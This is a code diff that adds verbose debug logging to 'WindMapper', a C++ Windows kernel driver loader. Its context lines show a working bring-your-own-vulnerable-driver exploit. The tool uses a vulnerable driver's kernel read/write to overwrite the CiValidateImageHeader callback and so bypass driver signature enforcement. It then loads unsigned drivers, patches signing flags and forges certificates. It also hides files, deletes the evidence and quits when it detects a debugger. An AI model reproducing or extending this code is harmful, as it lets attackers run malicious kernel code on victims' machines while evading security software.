@@ -3,12 +3,45 @@
 #include "EmbeddedDriver.h"
 #include <Shlwapi.h>
 #include <cstdio>
+#include <cstdarg>
 #include <tlhelp32.h>
 #include <string>
 #include <initguid.h>
 #include <wintrust.h>
 #include <softpub.h>
 #include <wincrypt.h>
+
+// ============ DEBUG LOGGING ============
+FILE* g_LogFile = nullptr;
+
+static void DbgLog(const char* func, const char* fmt, ...) {
+    char buf[2048];
+    va_list args;
+    va_start(args, fmt);
+
+    int prefixLen = snprintf(buf, sizeof(buf), "[WindMapper][%s] ", func);
+    if (prefixLen < 0) prefixLen = 0;
+    vsnprintf(buf + prefixLen, sizeof(buf) - prefixLen, fmt, args);
+    va_end(args);
+
+    // Console
+    printf("%s\n", buf);
+    fflush(stdout);
+
+    // Debug output (visible in WinDbg/DebugView)
+    OutputDebugStringA(buf);
+    OutputDebugStringA("\n");
+
+    // File log
+    if (g_LogFile) {
+        fprintf(g_LogFile, "%s\n", buf);
+        fflush(g_LogFile);
+    }
+}
+
+#define LOG(fmt, ...) DbgLog(__FUNCTION__, fmt, ##__VA_ARGS__)
+#define LOG_STATUS(msg, st) DbgLog(__FUNCTION__, "%s: 0x%08X (%s)", msg, (DWORD)(st), NT_SUCCESS(st) ? "SUCCESS" : "FAILED")
+// ============ END DEBUG LOGGING ============
 
 #pragma comment(lib, "Shlwapi.lib")
 #pragma comment(lib, "crypt32.lib")
@@ -34,13 +67,16 @@ namespace Utils {
     }
 
     BOOL InitializeNtFunctions() {
+        LOG("Resolving ntdll function pointers...");
         HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
         if (!ntdll) {
             ntdll = LoadLibraryW(L"ntdll.dll");
             if (!ntdll) {
+                LOG("FATAL: Failed to load ntdll.dll, GLE=%u", GetLastError());
                 return FALSE;
             }
         }
+        LOG("ntdll.dll base: %p", ntdll);
 
         NtQuerySystemInformationPtr = reinterpret_cast<pNtQuerySystemInformation>(
             GetProcAddress(ntdll, "NtQuerySystemInformation")
@@ -94,10 +130,20 @@ namespace Utils {
             GetProcAddress(ntdll, "NtSetInformationFile")
         );
 
-        return NtQuerySystemInformationPtr && NtLoadDriverPtr &&
+        BOOL result = NtQuerySystemInformationPtr && NtLoadDriverPtr &&
                NtUnloadDriverPtr && RtlAdjustPrivilegePtr &&
                RtlGetFullPathName_UExPtr && RtlCreateRegistryKeyPtr &&
                RtlWriteRegistryValuePtr && NtDeviceIoControlFilePtr;
+
+        LOG("NtQuerySystemInformation: %p", NtQuerySystemInformationPtr);
+        LOG("NtLoadDriver: %p", NtLoadDriverPtr);
+        LOG("NtUnloadDriver: %p", NtUnloadDriverPtr);
+        LOG("RtlAdjustPrivilege: %p", RtlAdjustPrivilegePtr);
+        LOG("NtDeviceIoControlFile: %p", NtDeviceIoControlFilePtr);
+        LOG("NtDeleteKey: %p, NtOpenKey: %p, NtFlushKey: %p", NtDeleteKeyPtr, NtOpenKeyPtr, NtFlushKeyPtr);
+        LOG("NtCreateFile: %p, NtSetInformationFile: %p", NtCreateFilePtr, NtSetInformationFilePtr);
+        LOG("InitializeNtFunctions result: %s", result ? "OK" : "FAILED (missing critical functions)");
+        return result;
     }
 
     NTSTATUS AdjustPrivilege(ULONG privilege, BOOLEAN enable) {
@@ -311,115 +357,184 @@ namespace Utils {
 namespace MapperCore {
 
     NTSTATUS TriggerExploit(PCWSTR targetDriverFileName, PCWSTR sentinelDriverFileName) {
+        LOG("=== TriggerExploit START ===");
+        LOG("Target driver: %ls", targetDriverFileName ? targetDriverFileName : L"(null)");
+        LOG("Sentinel driver: %ls", sentinelDriverFileName ? sentinelDriverFileName : L"(null)");
+
         HANDLE deviceHandle = nullptr;
         NTSTATUS status = VulnDriver::OpenDevice(&deviceHandle);
+        LOG_STATUS("OpenDevice (initial attempt)", status);
 
         if (!NT_SUCCESS(status)) {
+            LOG("Device not open, loading vuln driver via service...");
             status = DriverLoader::LoadDriver(g_LoaderServicePath);
+            LOG_STATUS("LoadDriver (vuln/loader)", status);
 
             if (!NT_SUCCESS(status) &&
                 status != STATUS_OBJECT_NAME_COLLISION &&
                 status != STATUS_IMAGE_ALREADY_LOADED) {
+                LOG("FATAL: LoadDriver failed with non-recoverable status 0x%08X", (DWORD)status);
                 return status;
             }
+            LOG("Waiting for device to appear (retrying up to 10 times)...");
             for (int retry = 0; retry < 10; retry++) {
                 Sleep(100);
                 status = VulnDriver::OpenDevice(&deviceHandle);
-                if (NT_SUCCESS(status)) break;
+                if (NT_SUCCESS(status)) {
+                    LOG("Device opened on retry %d, handle=%p", retry, deviceHandle);
+                    break;
+                }
             }
 
             if (!NT_SUCCESS(status)) {
+                LOG("FATAL: Device never appeared after 10 retries, status=0x%08X", (DWORD)status);
                 return status;
             }
+        } else {
+            LOG("Device already open, handle=%p", deviceHandle);
         }
         {
             PVOID ciValidateImageHeaderEntry = nullptr;
             PVOID zwFlushInstructionCache = nullptr;
 
-            if (KernelUtils::GetCiValidateImageHeaderEntry(&ciValidateImageHeaderEntry, &zwFlushInstructionCache) &&
-                ciValidateImageHeaderEntry && zwFlushInstructionCache) {
+            LOG("Resolving CiValidateImageHeader entry and ZwFlushInstructionCache...");
+            BOOL ciResult = KernelUtils::GetCiValidateImageHeaderEntry(&ciValidateImageHeaderEntry, &zwFlushInstructionCache);
+            LOG("GetCiValidateImageHeaderEntry: %s, entry=%p, zwFlush=%p", ciResult ? "TRUE" : "FALSE",
+                ciValidateImageHeaderEntry, zwFlushInstructionCache);
+
+            if (ciResult && ciValidateImageHeaderEntry && zwFlushInstructionCache) {
 
                 PVOID originalCallback = nullptr;
+                LOG("Reading original CI callback from kernel addr %p...", ciValidateImageHeaderEntry);
                 status = VulnDriver::ReadKernelMemory(deviceHandle, ciValidateImageHeaderEntry, &originalCallback, sizeof(PVOID));
+                LOG_STATUS("ReadKernelMemory (original CI callback)", status);
+                LOG("Original CI callback value: %p", originalCallback);
+
                 if (NT_SUCCESS(status)) {
                     g_OriginalCiCallback = originalCallback;
                     g_CiCallbackAddress = ciValidateImageHeaderEntry;
 
+                    LOG("Patching CI callback -> ZwFlushInstructionCache (%p)...", zwFlushInstructionCache);
                     status = VulnDriver::WriteKernelMemory(deviceHandle, ciValidateImageHeaderEntry, &zwFlushInstructionCache, sizeof(PVOID));
+                    LOG_STATUS("WriteKernelMemory (CI patch)", status);
+
                     if (NT_SUCCESS(status)) {
                         g_CiCallbackPatched = true;
+                        LOG("CI callback patched successfully, now loading target driver...");
+                        LOG("Target driver service path: %ls", g_DriverServicePath);
                         status = DriverLoader::LoadDriver(g_DriverServicePath);
+                        LOG_STATUS("LoadDriver (WhosWho/target)", status);
+
                         NTSTATUS sentStatus = STATUS_UNSUCCESSFUL;
                         if (NT_SUCCESS(status) && sentinelDriverFileName && g_SentinelServicePath[0]) {
+                            LOG("Loading sentinel driver, service path: %ls", g_SentinelServicePath);
                             sentStatus = DriverLoader::LoadDriver(g_SentinelServicePath);
+                            LOG_STATUS("LoadDriver (Sentinel)", sentStatus);
+                        } else if (!NT_SUCCESS(status)) {
+                            LOG("Skipping Sentinel load because target driver failed");
                         }
 
-                        VulnDriver::WriteKernelMemory(deviceHandle, ciValidateImageHeaderEntry, &originalCallback, sizeof(PVOID));
+                        LOG("Restoring original CI callback %p...", originalCallback);
+                        NTSTATUS restoreStatus = VulnDriver::WriteKernelMemory(deviceHandle, ciValidateImageHeaderEntry, &originalCallback, sizeof(PVOID));
+                        LOG_STATUS("WriteKernelMemory (CI restore)", restoreStatus);
                         g_CiCallbackPatched = false;
+
                         if (NT_SUCCESS(status)) {
-                            KernelUtils::PatchDriverSigningFlags(deviceHandle, targetDriverFileName);
+                            LOG("Patching driver signing flags for target: %ls", targetDriverFileName);
+                            BOOL patchResult = KernelUtils::PatchDriverSigningFlags(deviceHandle, targetDriverFileName);
+                            LOG("PatchDriverSigningFlags (target): %s", patchResult ? "OK" : "FAILED");
+
                             if (NT_SUCCESS(sentStatus) && sentinelDriverFileName) {
-                                KernelUtils::PatchDriverSigningFlags(deviceHandle, sentinelDriverFileName);
+                                LOG("Patching driver signing flags for sentinel: %ls", sentinelDriverFileName);
+                                patchResult = KernelUtils::PatchDriverSigningFlags(deviceHandle, sentinelDriverFileName);
+                                LOG("PatchDriverSigningFlags (sentinel): %s", patchResult ? "OK" : "FAILED");
                             }
                         }
+                    } else {
+                        LOG("FATAL: Failed to write CI callback patch!");
                     }
+                } else {
+                    LOG("FATAL: Failed to read original CI callback!");
                 }
+            } else {
+                LOG("FATAL: GetCiValidateImageHeaderEntry failed - cannot proceed with exploit");
+                status = STATUS_NOT_FOUND;
             }
         }
 
 
         if (NT_SUCCESS(status) && sentinelDriverFileName && g_SentinelServicePath[0]) {
-
+            LOG("--- WriteSentinelGlobals phase ---");
             ULONG sentImageSize = 0;
             PVOID sentBase = KernelUtils::GetDriverBaseByName(sentinelDriverFileName, &sentImageSize);
+            LOG("Sentinel driver base: %p, size: 0x%X", sentBase, sentImageSize);
             if (sentBase) {
                 g_SentinelLoadAddress = sentBase;
                 g_SentinelImageSize = sentImageSize;
                 ULONG whoswhoImageSize = 0;
                 PVOID whoswhoBase = KernelUtils::GetDriverBaseByName(targetDriverFileName, &whoswhoImageSize);
+                LOG("WhosWho driver base: %p, size: 0x%X", whoswhoBase, whoswhoImageSize);
                 if (whoswhoBase) {
                     g_DriverLoadAddress = whoswhoBase;
-                    if (WriteSentinelGlobals(deviceHandle, sentBase, sentImageSize,
-                                             whoswhoBase, whoswhoImageSize)) {
-                    } else {
-                    }
+                    BOOL wsgResult = WriteSentinelGlobals(deviceHandle, sentBase, sentImageSize,
+                                             whoswhoBase, whoswhoImageSize);
+                    LOG("WriteSentinelGlobals result: %s", wsgResult ? "OK" : "FAILED");
                 } else {
+                    LOG("ERROR: Could not find WhosWho driver in loaded modules!");
                 }
             } else {
+                LOG("ERROR: Could not find Sentinel driver in loaded modules!");
             }
         }
 
 
+        LOG("Closing vuln device and unloading loader driver...");
         VulnDriver::CloseDevice(deviceHandle);
         DriverLoader::UnloadDriver(g_LoaderServicePath);
 
+        LOG("=== TriggerExploit END, status=0x%08X ===", (DWORD)status);
         return status;
     }
 
     NTSTATUS WindLoadDriver(PCWSTR loaderPath, PCWSTR driverPath, PCWSTR sentinelPath) {
+        LOG("=== WindLoadDriver START ===");
+        LOG("loaderPath: %ls", loaderPath ? loaderPath : L"(null)");
+        LOG("driverPath: %ls", driverPath ? driverPath : L"(null)");
+        LOG("sentinelPath: %ls", sentinelPath ? sentinelPath : L"(null)");
+
         NTSTATUS status = Utils::AdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE);
+        LOG_STATUS("AdjustPrivilege (SeLoadDriverPrivilege)", status);
         if (!NT_SUCCESS(status)) {
+            LOG("FATAL: Cannot acquire SeLoadDriverPrivilege!");
             return status;
         }
 
         WCHAR loaderFullPath[520];
         status = Utils::GetFullPath(loaderPath, loaderFullPath, sizeof(loaderFullPath));
+        LOG_STATUS("GetFullPath (loader)", status);
         if (!NT_SUCCESS(status)) {
             return status;
         }
+        LOG("Loader full path: %ls", loaderFullPath);
 
         WCHAR driverFullPath[520];
         status = Utils::GetFullPath(driverPath, driverFullPath, sizeof(driverFullPath));
+        LOG_STATUS("GetFullPath (driver)", status);
         if (!NT_SUCCESS(status)) {
             return status;
         }
+        LOG("Driver full path: %ls", driverFullPath);
 
         status = DriverLoader::CreateDriverService(g_DriverServicePath, driverFullPath);
+        LOG_STATUS("CreateDriverService (target driver)", status);
+        LOG("Driver service path: %ls", g_DriverServicePath);
         if (!NT_SUCCESS(status)) {
             return status;
         }
 
         status = DriverLoader::CreateDriverService(g_LoaderServicePath, loaderFullPath);
+        LOG_STATUS("CreateDriverService (loader)", status);
+        LOG("Loader service path: %ls", g_LoaderServicePath);
         if (!NT_SUCCESS(status)) {
             return status;
         }
@@ -428,10 +543,14 @@ namespace MapperCore {
         WCHAR sentinelFullPath[520] = {};
         if (sentinelPath && sentinelPath[0]) {
             status = Utils::GetFullPath(sentinelPath, sentinelFullPath, sizeof(sentinelFullPath));
+            LOG_STATUS("GetFullPath (sentinel)", status);
             if (!NT_SUCCESS(status)) {
                 return status;
             }
+            LOG("Sentinel full path: %ls", sentinelFullPath);
             status = DriverLoader::CreateDriverService(g_SentinelServicePath, sentinelFullPath);
+            LOG_STATUS("CreateDriverService (sentinel)", status);
+            LOG("Sentinel service path: %ls", g_SentinelServicePath);
             if (!NT_SUCCESS(status)) {
                 return status;
             }
@@ -548,10 +667,15 @@ namespace MapperCore {
             else sentinelFileName = sentinelFullPath;
         }
 
+        LOG("Calling TriggerExploit...");
         status = TriggerExploit(targetFileName, sentinelFileName);
+        LOG_STATUS("TriggerExploit", status);
         if (NT_SUCCESS(status)) {
+            LOG("Cleaning up driver file: %ls", driverFullPath);
             if (Utils::ForceDeleteOrRename(driverFullPath)) {
+                LOG("Driver file deleted/renamed OK");
             } else {
+                LOG("WARNING: Failed to delete driver file");
             }
 
             if (sentinelFullPath[0]) {
@@ -583,23 +707,33 @@ namespace MapperCore {
 
     BOOL WriteSentinelGlobals(HANDLE device, PVOID sentinelBase, ULONG sentinelImageSize,
                               PVOID whoswhoBase, ULONG whoswhoSize) {
-
+        LOG("=== WriteSentinelGlobals ===");
+        LOG("sentinelBase=%p, sentinelImageSize=0x%X", sentinelBase, sentinelImageSize);
+        LOG("whoswhoBase=%p, whoswhoSize=0x%X", whoswhoBase, whoswhoSize);
 
         IMAGE_DOS_HEADER dosHeader = {};
         NTSTATUS status = VulnDriver::ReadKernelMemory(device, sentinelBase, &dosHeader, sizeof(dosHeader));
+        LOG_STATUS("ReadKernelMemory (DOS header)", status);
         if (!NT_SUCCESS(status) || dosHeader.e_magic != IMAGE_DOS_SIGNATURE) {
+            LOG("ERROR: Invalid DOS header, e_magic=0x%04X", dosHeader.e_magic);
             return FALSE;
         }
+        LOG("DOS header OK, e_lfanew=0x%X", dosHeader.e_lfanew);
 
 
         PVOID ntHeaderAddr = reinterpret_cast<PVOID>(
             reinterpret_cast<ULONG_PTR>(sentinelBase) + dosHeader.e_lfanew);
+        LOG("NT headers addr: %p", ntHeaderAddr);
 
         IMAGE_NT_HEADERS64 ntHeaders = {};
         status = VulnDriver::ReadKernelMemory(device, ntHeaderAddr, &ntHeaders, sizeof(ntHeaders));
+        LOG_STATUS("ReadKernelMemory (NT headers)", status);
         if (!NT_SUCCESS(status) || ntHeaders.Signature != IMAGE_NT_SIGNATURE) {
+            LOG("ERROR: Invalid NT headers, Signature=0x%X", ntHeaders.Signature);
             return FALSE;
         }
+        LOG("NT headers OK, %d sections, SizeOfOptionalHeader=0x%X",
+            ntHeaders.FileHeader.NumberOfSections, ntHeaders.FileHeader.SizeOfOptionalHeader);
 
 
         ULONG_PTR sectionTableAddr =
@@ -609,7 +743,7 @@ namespace MapperCore {
 
         WORD numSections = ntHeaders.FileHeader.NumberOfSections;
         if (numSections > 64) numSections = 64;
-
+        LOG("Reading %d section headers from %p...", numSections, (PVOID)sectionTableAddr);
 
         IMAGE_SECTION_HEADER sections[64] = {};
         status = VulnDriver::ReadKernelMemory(
@@ -617,9 +751,17 @@ namespace MapperCore {
             reinterpret_cast<PVOID>(sectionTableAddr),
             sections,
             numSections * sizeof(IMAGE_SECTION_HEADER));
+        LOG_STATUS("ReadKernelMemory (section headers)", status);
 
         if (!NT_SUCCESS(status)) {
             return FALSE;
+        }
+
+        for (WORD i = 0; i < numSections; i++) {
+            char secName[9] = {};
+            memcpy(secName, sections[i].Name, 8);
+            LOG("  Section[%d]: '%s' VA=0x%X VSize=0x%X",
+                i, secName, sections[i].VirtualAddress, sections[i].Misc.VirtualSize);
         }
 
 
@@ -630,22 +772,26 @@ namespace MapperCore {
                 sntlKernelAddr = reinterpret_cast<PVOID>(
                     reinterpret_cast<ULONG_PTR>(sentinelBase) + sections[i].VirtualAddress);
                 sntlSize = sections[i].Misc.VirtualSize;
+                LOG("Found .sntl section at kernel addr %p, size=0x%X", sntlKernelAddr, sntlSize);
                 break;
             }
         }
 
         if (!sntlKernelAddr) {
+            LOG("ERROR: .sntl section not found in Sentinel driver!");
             return FALSE;
         }
 
-
         if (sntlSize < 0x14) {
+            LOG("ERROR: .sntl section too small (0x%X < 0x14)", sntlSize);
             return FALSE;
         }
 
 
         PVOID baseSlotAddr = sntlKernelAddr;
+        LOG("Writing WhosWho base (%p) to .sntl+0x0 (%p)...", whoswhoBase, baseSlotAddr);
         status = VulnDriver::WriteKernelMemory(device, baseSlotAddr, &whoswhoBase, sizeof(PVOID));
+        LOG_STATUS("WriteKernelMemory (.sntl base slot)", status);
         if (!NT_SUCCESS(status)) {
             return FALSE;
         }
@@ -654,12 +800,12 @@ namespace MapperCore {
         if (whoswhoSize > 0) {
             PVOID sizeSlotAddr = reinterpret_cast<PVOID>(
                 reinterpret_cast<ULONG_PTR>(sntlKernelAddr) + 0x10);
+            LOG("Writing WhosWho size (0x%X) to .sntl+0x10 (%p)...", whoswhoSize, sizeSlotAddr);
             status = VulnDriver::WriteKernelMemory(device, sizeSlotAddr, &whoswhoSize, sizeof(ULONG));
-            if (!NT_SUCCESS(status)) {
-            } else {
-            }
+            LOG_STATUS("WriteKernelMemory (.sntl size slot)", status);
         }
 
+        LOG("WriteSentinelGlobals completed successfully");
         return TRUE;
     }
 
@@ -902,8 +1048,35 @@ static void RunSignatureCheck(LPCWSTR filePath) {
 }
 
 int main(int argc, char* argv[]) {
+    // Open log file immediately
+    fopen_s(&g_LogFile, "C:\\WindMapper_debug.log", "w");
+    LOG("============================================");
+    LOG("WindMapper started, argc=%d", argc);
+    for (int i = 0; i < argc; i++) {
+        LOG("  argv[%d] = '%s'", i, argv[i]);
+    }
+
+    // Log OS version
+    {
+        typedef NTSTATUS(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
+        HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
+        if (ntdll) {
+            RtlGetVersionPtr fn = (RtlGetVersionPtr)GetProcAddress(ntdll, "RtlGetVersion");
+            if (fn) {
+                RTL_OSVERSIONINFOW osvi = { sizeof(osvi) };
+                if (fn(&osvi) == 0) {
+                    LOG("OS: Windows %u.%u Build %u (isWin11=%s)",
+                        osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber,
+                        osvi.dwBuildNumber >= 22000 ? "YES" : "NO");
+                }
+            }
+        }
+    }
+
 #ifndef _DEBUG
     if (AntiDetect::IsBeingDebugged()) {
+        LOG("Debugger detected, exiting.");
+        if (g_LogFile) fclose(g_LogFile);
         return 1;
     }
 #endif
@@ -917,38 +1090,55 @@ int main(int argc, char* argv[]) {
             tp.Privileges[0].Luid = luid;
             tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
             if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
+                LOG("FATAL: AdjustTokenPrivileges failed, GLE=%u", GetLastError());
                 CloseHandle(hToken);
+                if (g_LogFile) fclose(g_LogFile);
                 return 1;
             }
+            LOG("SeLoadDriverPrivilege acquired via token adjustment");
+        } else {
+            LOG("WARNING: LookupPrivilegeValue failed, GLE=%u", GetLastError());
         }
         CloseHandle(hToken);
+    } else {
+        LOG("WARNING: OpenProcessToken failed, GLE=%u", GetLastError());
     }
 
     if (argc < 2) {
+        LOG("FATAL: argc < 2 - missing driver argument");
+        if (g_LogFile) fclose(g_LogFile);
         return 1;
     }
 
     if (!Utils::InitializeNtFunctions()) {
+        LOG("FATAL: InitializeNtFunctions failed");
+        if (g_LogFile) fclose(g_LogFile);
         return 1;
     }
 
+    LOG("Initializing embedded driver data...");
     if (!InitializeDriverData()) {
+        LOG("FATAL: InitializeDriverData failed");
+        if (g_LogFile) fclose(g_LogFile);
         return 1;
     }
+    LOG("Embedded driver: size=%zu bytes", g_P2CDriverSize);
 
     std::wstring driverArg;
     {
         size_t argLen = strlen(argv[1]);
         int wideLen = MultiByteToWideChar(CP_ACP, 0, argv[1], -1, nullptr, 0);
         if (wideLen <= 0) {
+            LOG("FATAL: MultiByteToWideChar failed for driver arg");
             ReleaseDriverData();
+            if (g_LogFile) fclose(g_LogFile);
             return 1;
         }
         driverArg.resize(static_cast<size_t>(wideLen));
         MultiByteToWideChar(CP_ACP, 0, argv[1], -1, &driverArg[0], wideLen);
         driverArg.resize(wcslen(driverArg.c_str()));
     }
-
+    LOG("Driver arg: %ls", driverArg.c_str());
 
     std::wstring sentinelArg;
     if (argc >= 3) {
@@ -959,16 +1149,23 @@ int main(int argc, char* argv[]) {
             sentinelArg.resize(wcslen(sentinelArg.c_str()));
         }
     }
+    LOG("Sentinel arg: %ls", sentinelArg.empty() ? L"(none)" : sentinelArg.c_str());
 
     if (g_P2CDriverSize == 0) {
+        LOG("FATAL: g_P2CDriverSize == 0 after init");
         ReleaseDriverData();
+        if (g_LogFile) fclose(g_LogFile);
         return 1;
     }
     std::wstring loaderFilePath = Utils::GetTempFilePath(L".sys");
     std::wstring driverFilePath = Utils::GetTempFilePath(L".sys");
+    LOG("Loader temp path: %ls", loaderFilePath.c_str());
+    LOG("Driver temp path: %ls", driverFilePath.c_str());
 
     if (loaderFilePath.empty() || driverFilePath.empty()) {
+        LOG("FATAL: Failed to generate temp file paths");
         ReleaseDriverData();
+        if (g_LogFile) fclose(g_LogFile);
         return 1;
     }
 
@@ -983,7 +1180,9 @@ int main(int argc, char* argv[]) {
     );
 
     if (loaderFile == INVALID_HANDLE_VALUE) {
+        LOG("FATAL: CreateFileW for loader failed, GLE=%u", GetLastError());
         ReleaseDriverData();
+        if (g_LogFile) fclose(g_LogFile);
         return 1;
     }
 
@@ -993,15 +1192,21 @@ int main(int argc, char* argv[]) {
     DWORD writeErr = GetLastError();
     FlushFileBuffers(loaderFile);
     CloseHandle(loaderFile);
+    LOG("Wrote loader driver: writeOk=%d, written=%u, expected=%u, GLE=%u", writeOk, written, expectedSize, writeErr);
 
     ReleaseDriverData();
 
     if (!writeOk || written != expectedSize) {
+        LOG("FATAL: Loader driver write failed");
         Utils::SecureDeleteFile(loaderFilePath.c_str());
+        if (g_LogFile) fclose(g_LogFile);
         return 1;
     }
+    LOG("Copying target driver from %ls to %ls", driverArg.c_str(), driverFilePath.c_str());
     if (!CopyFileW(driverArg.c_str(), driverFilePath.c_str(), FALSE)) {
+        LOG("FATAL: CopyFileW for target driver failed, GLE=%u", GetLastError());
         Utils::ForceDeleteOrRename(loaderFilePath.c_str());
+        if (g_LogFile) fclose(g_LogFile);
         return 1;
     }
 
@@ -1009,39 +1214,57 @@ int main(int argc, char* argv[]) {
     std::wstring sentinelFilePath;
     if (!sentinelArg.empty()) {
         sentinelFilePath = Utils::GetTempFilePath(L".sys");
+        LOG("Sentinel temp path: %ls", sentinelFilePath.c_str());
         if (sentinelFilePath.empty()) {
+            LOG("FATAL: Failed to generate sentinel temp path");
             Utils::ForceDeleteOrRename(loaderFilePath.c_str());
             Utils::ForceDeleteOrRename(driverFilePath.c_str());
+            if (g_LogFile) fclose(g_LogFile);
             return 1;
         }
+        LOG("Copying sentinel from %ls to %ls", sentinelArg.c_str(), sentinelFilePath.c_str());
         if (!CopyFileW(sentinelArg.c_str(), sentinelFilePath.c_str(), FALSE)) {
+            LOG("FATAL: CopyFileW for sentinel failed, GLE=%u", GetLastError());
             Utils::ForceDeleteOrRename(loaderFilePath.c_str());
             Utils::ForceDeleteOrRename(driverFilePath.c_str());
+            if (g_LogFile) fclose(g_LogFile);
             return 1;
         }
 
+        LOG("Self-signing sentinel driver...");
         if (!SignedMemory::SelfSignDriver(sentinelFilePath.c_str())) {
+            LOG("SelfSignDriver (sentinel) failed, trying TransplantCertificate...");
             SignedMemory::TransplantCertificateToDriver(sentinelFilePath.c_str());
+        } else {
+            LOG("SelfSignDriver (sentinel) OK");
         }
         SetFileAttributesW(sentinelFilePath.c_str(),
                            FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY);
     }
 
+    LOG("Self-signing target driver...");
     if (!SignedMemory::SelfSignDriver(driverFilePath.c_str())) {
+        LOG("SelfSignDriver (target) failed, trying TransplantCertificate...");
         SignedMemory::TransplantCertificateToDriver(driverFilePath.c_str());
+    } else {
+        LOG("SelfSignDriver (target) OK");
     }
 
     SetFileAttributesW(driverFilePath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY);
 
+    LOG("=== Calling WindLoadDriver ===");
     NTSTATUS status = MapperCore::WindLoadDriver(
         loaderFilePath.c_str(),
         driverFilePath.c_str(),
         sentinelFilePath.empty() ? nullptr : sentinelFilePath.c_str());
+    LOG_STATUS("WindLoadDriver final result", status);
 
     if (NT_SUCCESS(status)) {
+        LOG("SUCCESS - Running signature check...");
         RunSignatureCheck(driverFilePath.c_str());
     }
 
+    LOG("Cleaning up temp files...");
     Utils::ForceDeleteOrRename(loaderFilePath.c_str());
     Utils::ForceDeleteOrRename(driverFilePath.c_str());
     if (!sentinelFilePath.empty())
@@ -1050,12 +1273,18 @@ int main(int argc, char* argv[]) {
     MapperCore::CleanupArtifacts();
 
     if (NT_SUCCESS(status)) {
+        LOG("=== FINAL: SUCCESS ===");
+        LOG("Driver loaded at: %p", g_DriverLoadAddress);
         if (g_SentinelLoadAddress) {
+            LOG("Sentinel loaded at: %p, size: 0x%X", g_SentinelLoadAddress, g_SentinelImageSize);
         }
         if (g_DonorCopyPath[0]) {
+            LOG("Donor copy: %ls", g_DonorCopyPath);
         }
     } else {
+        LOG("=== FINAL: FAILED, status=0x%08X ===", (DWORD)status);
     }
 
+    if (g_LogFile) fclose(g_LogFile);
     return NT_SUCCESS(status) ? 0 : 1;
 }
